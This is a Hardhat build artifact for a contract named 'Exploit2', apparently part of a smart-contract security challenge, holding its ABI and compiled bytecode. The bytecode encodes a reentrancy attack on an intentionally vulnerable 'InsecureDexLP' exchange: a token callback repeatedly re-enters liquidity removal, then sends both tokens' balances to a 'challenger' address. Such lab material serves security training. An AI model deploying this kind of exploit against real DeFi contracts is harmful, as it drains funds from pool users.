{
  "_format": "hh-sol-artifact-1",
  "contractName": "Exploit2",
  "sourceName": "contracts/exploits/Exploit2.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract IERC20",
          "name": "t0",
          "type": "address"
        },
        {
          "internalType": "contract IERC20",
          "name": "t1",
          "type": "address"
        },
        {
          "internalType": "contract InsecureDexLP",
          "name": "d",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "dex_s",
      "outputs": [
        {
          "internalType": "contract InsecureDexLP",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "internalType": "address",
          "name": "challenger",
          "type": "address"
        }
      ],
      "name": "run",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "token0_s",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "token1_s",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "tokenFallback",
      "outputs": [
        {
          "internalType": "bool",
          "name": "success",
          "type": "bool"
        },
        {
          "internalType": "bytes",
          "name": "result",
          "type": "bytes"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052600a600460006101000a81548160ff021916908360ff1602179055503480156200002d57600080fd5b50604051620012963803806200129683398181016040528101906200005391906200037f565b826000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16678ac7230489e800006040518363ffffffff1660e01b81526004016200019c92919062000443565b6020604051808303816000875af1158015620001bc573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620001e29190620004ad565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b3600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16678ac7230489e800006040518363ffffffff1660e01b81526004016200026c92919062000443565b6020604051808303816000875af11580156200028c573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620002b29190620004ad565b50505050620004df565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620002ee82620002c1565b9050919050565b60006200030282620002e1565b9050919050565b6200031481620002f5565b81146200032057600080fd5b50565b600081519050620003348162000309565b92915050565b60006200034782620002e1565b9050919050565b62000359816200033a565b81146200036557600080fd5b50565b60008151905062000379816200034e565b92915050565b6000806000606084860312156200039b576200039a620002bc565b5b6000620003ab8682870162000323565b9350506020620003be8682870162000323565b9250506040620003d18682870162000368565b9150509250925092565b620003e681620002e1565b82525050565b6000819050919050565b6000819050919050565b6000819050919050565b60006200042b620004256200041f84620003ec565b62000400565b620003f6565b9050919050565b6200043d816200040a565b82525050565b60006040820190506200045a6000830185620003db565b62000469602083018462000432565b9392505050565b60008115159050919050565b620004878162000470565b81146200049357600080fd5b50565b600081519050620004a7816200047c565b92915050565b600060208284031215620004c657620004c5620002bc565b5b6000620004d68482850162000496565b91505092915050565b610da780620004ef6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c80630c25fa3d1461005c5780635e1250d81461007a578063848214c414610096578063bfef007c146100b4578063c0ee0b8a146100d2575b600080fd5b610064610103565b60405161007191906107e4565b60405180910390f35b610094600480360381019061008f9190610887565b610129565b005b61009e6102e0565b6040516100ab91906107e4565b60405180910390f35b6100bc610304565b6040516100c991906108e8565b60405180910390f35b6100ec60048036038101906100e79190610a49565b61032a565b6040516100fa929190610b5b565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8160038190555080600460026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001600460016101000a81548160ff0219169083151502179055506000600460006101000a81548160ff021916908360ff160217905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639cd441da6003546003546040518363ffffffff1660e01b8152600401610209929190610b9a565b600060405180830381600087803b15801561022357600080fd5b505af1158015610237573d6000803e3d6000fd5b50505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639c8f9f236003546040518263ffffffff1660e01b81526004016102989190610bc3565b60408051808303816000875af11580156102b6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102da9190610bf3565b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006060600460019054906101000a900460ff16801561035c57506009600460009054906101000a900460ff1660ff16105b1561043f576004600081819054906101000a900460ff168092919061038090610c6f565b91906101000a81548160ff021916908360ff16021790555050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639c8f9f236003546040518263ffffffff1660e01b81526004016103f69190610bc3565b60408051808303816000875af1158015610414573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104389190610bf3565b5050610747565b600460019054906101000a900460ff16801561046d57506009600460009054906101000a900460ff1660ff16145b156107465760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600460029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161052a9190610ca7565b602060405180830381865afa158015610547573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061056b9190610cc2565b6040518363ffffffff1660e01b8152600401610588929190610cef565b6020604051808303816000875af11580156105a7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105cb9190610d44565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600460029054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106889190610ca7565b602060405180830381865afa1580156106a5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106c99190610cc2565b6040518363ffffffff1660e01b81526004016106e6929190610cef565b6020604051808303816000875af1158015610705573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107299190610d44565b506000600460016101000a81548160ff0219169083151502179055505b5b60019150604051806020016040528060008152509050935093915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006107aa6107a56107a084610765565b610785565b610765565b9050919050565b60006107bc8261078f565b9050919050565b60006107ce826107b1565b9050919050565b6107de816107c3565b82525050565b60006020820190506107f960008301846107d5565b92915050565b6000604051905090565b600080fd5b600080fd5b6000819050919050565b61082681610813565b811461083157600080fd5b50565b6000813590506108438161081d565b92915050565b600061085482610765565b9050919050565b61086481610849565b811461086f57600080fd5b50565b6000813590506108818161085b565b92915050565b6000806040838503121561089e5761089d610809565b5b60006108ac85828601610834565b92505060206108bd85828601610872565b9150509250929050565b60006108d2826107b1565b9050919050565b6108e2816108c7565b82525050565b60006020820190506108fd60008301846108d9565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6109568261090d565b810181811067ffffffffffffffff821117156109755761097461091e565b5b80604052505050565b60006109886107ff565b9050610994828261094d565b919050565b600067ffffffffffffffff8211156109b4576109b361091e565b5b6109bd8261090d565b9050602081019050919050565b82818337600083830152505050565b60006109ec6109e784610999565b61097e565b905082815260208101848484011115610a0857610a07610908565b5b610a138482856109ca565b509392505050565b600082601f830112610a3057610a2f610903565b5b8135610a408482602086016109d9565b91505092915050565b600080600060608486031215610a6257610a61610809565b5b6000610a7086828701610872565b9350506020610a8186828701610834565b925050604084013567ffffffffffffffff811115610aa257610aa161080e565b5b610aae86828701610a1b565b9150509250925092565b60008115159050919050565b610acd81610ab8565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610b0d578082015181840152602081019050610af2565b83811115610b1c576000848401525b50505050565b6000610b2d82610ad3565b610b378185610ade565b9350610b47818560208601610aef565b610b508161090d565b840191505092915050565b6000604082019050610b706000830185610ac4565b8181036020830152610b828184610b22565b90509392505050565b610b9481610813565b82525050565b6000604082019050610baf6000830185610b8b565b610bbc6020830184610b8b565b9392505050565b6000602082019050610bd86000830184610b8b565b92915050565b600081519050610bed8161081d565b92915050565b60008060408385031215610c0a57610c09610809565b5b6000610c1885828601610bde565b9250506020610c2985828601610bde565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600060ff82169050919050565b6000610c7a82610c62565b915060ff8203610c8d57610c8c610c33565b5b600182019050919050565b610ca181610849565b82525050565b6000602082019050610cbc6000830184610c98565b92915050565b600060208284031215610cd857610cd7610809565b5b6000610ce684828501610bde565b91505092915050565b6000604082019050610d046000830185610c98565b610d116020830184610b8b565b9392505050565b610d2181610ab8565b8114610d2c57600080fd5b50565b600081519050610d3e81610d18565b92915050565b600060208284031215610d5a57610d59610809565b5b6000610d6884828501610d2f565b9150509291505056fea26469706673582212207c7c1a20ca7fe35c0c467ca4d50f07efa2f2480730be8f194cb058292418d05164736f6c634300080e0033",
  "deployedBytecode": "0x608060405234801561001057600080fd5b50600436106100575760003560e01c80630c25fa3d1461005c5780635e1250d81461007a578063848214c414610096578063bfef007c146100b4578063c0ee0b8a146100d2575b600080fd5b610064610103565b60405161007191906107e4565b60405180910390f35b610094600480360381019061008f9190610887565b610129565b005b61009e6102e0565b6040516100ab91906107e4565b60405180910390f35b6100bc610304565b6040516100c991906108e8565b60405180910390f35b6100ec60048036038101906100e79190610a49565b61032a565b6040516100fa929190610b5b565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b8160038190555080600460026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506001600460016101000a81548160ff0219169083151502179055506000600460006101000a81548160ff021916908360ff160217905550600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639cd441da6003546003546040518363ffffffff1660e01b8152600401610209929190610b9a565b600060405180830381600087803b15801561022357600080fd5b505af1158015610237573d6000803e3d6000fd5b50505050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639c8f9f236003546040518263ffffffff1660e01b81526004016102989190610bc3565b60408051808303816000875af11580156102b6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102da9190610bf3565b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60006060600460019054906101000a900460ff16801561035c57506009600460009054906101000a900460ff1660ff16105b1561043f576004600081819054906101000a900460ff168092919061038090610c6f565b91906101000a81548160ff021916908360ff16021790555050600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639c8f9f236003546040518263ffffffff1660e01b81526004016103f69190610bc3565b60408051808303816000875af1158015610414573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104389190610bf3565b5050610747565b600460019054906101000a900460ff16801561046d57506009600460009054906101000a900460ff1660ff16145b156107465760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600460029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161052a9190610ca7565b602060405180830381865afa158015610547573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061056b9190610cc2565b6040518363ffffffff1660e01b8152600401610588929190610cef565b6020604051808303816000875af11580156105a7573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105cb9190610d44565b50600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600460029054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106889190610ca7565b602060405180830381865afa1580156106a5573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106c99190610cc2565b6040518363ffffffff1660e01b81526004016106e6929190610cef565b6020604051808303816000875af1158015610705573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107299190610d44565b506000600460016101000a81548160ff0219169083151502179055505b5b60019150604051806020016040528060008152509050935093915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006107aa6107a56107a084610765565b610785565b610765565b9050919050565b60006107bc8261078f565b9050919050565b60006107ce826107b1565b9050919050565b6107de816107c3565b82525050565b60006020820190506107f960008301846107d5565b92915050565b6000604051905090565b600080fd5b600080fd5b6000819050919050565b61082681610813565b811461083157600080fd5b50565b6000813590506108438161081d565b92915050565b600061085482610765565b9050919050565b61086481610849565b811461086f57600080fd5b50565b6000813590506108818161085b565b92915050565b6000806040838503121561089e5761089d610809565b5b60006108ac85828601610834565b92505060206108bd85828601610872565b9150509250929050565b60006108d2826107b1565b9050919050565b6108e2816108c7565b82525050565b60006020820190506108fd60008301846108d9565b92915050565b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6109568261090d565b810181811067ffffffffffffffff821117156109755761097461091e565b5b80604052505050565b60006109886107ff565b9050610994828261094d565b919050565b600067ffffffffffffffff8211156109b4576109b361091e565b5b6109bd8261090d565b9050602081019050919050565b82818337600083830152505050565b60006109ec6109e784610999565b61097e565b905082815260208101848484011115610a0857610a07610908565b5b610a138482856109ca565b509392505050565b600082601f830112610a3057610a2f610903565b5b8135610a408482602086016109d9565b91505092915050565b600080600060608486031215610a6257610a61610809565b5b6000610a7086828701610872565b9350506020610a8186828701610834565b925050604084013567ffffffffffffffff811115610aa257610aa161080e565b5b610aae86828701610a1b565b9150509250925092565b60008115159050919050565b610acd81610ab8565b82525050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610b0d578082015181840152602081019050610af2565b83811115610b1c576000848401525b50505050565b6000610b2d82610ad3565b610b378185610ade565b9350610b47818560208601610aef565b610b508161090d565b840191505092915050565b6000604082019050610b706000830185610ac4565b8181036020830152610b828184610b22565b90509392505050565b610b9481610813565b82525050565b6000604082019050610baf6000830185610b8b565b610bbc6020830184610b8b565b9392505050565b6000602082019050610bd86000830184610b8b565b92915050565b600081519050610bed8161081d565b92915050565b60008060408385031215610c0a57610c09610809565b5b6000610c1885828601610bde565b9250506020610c2985828601610bde565b9150509250929050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b600060ff82169050919050565b6000610c7a82610c62565b915060ff8203610c8d57610c8c610c33565b5b600182019050919050565b610ca181610849565b82525050565b6000602082019050610cbc6000830184610c98565b92915050565b600060208284031215610cd857610cd7610809565b5b6000610ce684828501610bde565b91505092915050565b6000604082019050610d046000830185610c98565b610d116020830184610b8b565b9392505050565b610d2181610ab8565b8114610d2c57600080fd5b50565b600081519050610d3e81610d18565b92915050565b600060208284031215610d5a57610d59610809565b5b6000610d6884828501610d2f565b9150509291505056fea26469706673582212207c7c1a20ca7fe35c0c467ca4d50f07efa2f2480730be8f194cb058292418d05164736f6c634300080e0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}
